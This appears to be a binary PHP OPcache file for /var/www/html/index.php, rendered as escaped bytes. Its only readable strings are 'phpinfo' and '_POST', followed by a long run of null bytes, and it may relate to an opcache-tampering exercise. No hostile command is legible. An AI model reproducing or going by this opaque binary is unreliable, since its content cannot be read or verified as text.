00\x00\x00\x00\x80F\&quot;e\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#olh\x99F\&quot;e\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\&quot;@\xb0\xc5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x90\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xf9\xe0\xf8\xab\xb5\xd0\x00\x80\x07\x00\x00\x00\x00\x00\x00\x00phpinfo\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00E\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00=\x00\x01\x00\x8b\x08\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x02\x00\x00\x00\x81\x00\x00\x007\x06\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff`\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x02\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x03\x00\x00\x00I\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\x00\x00\x00&gt;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00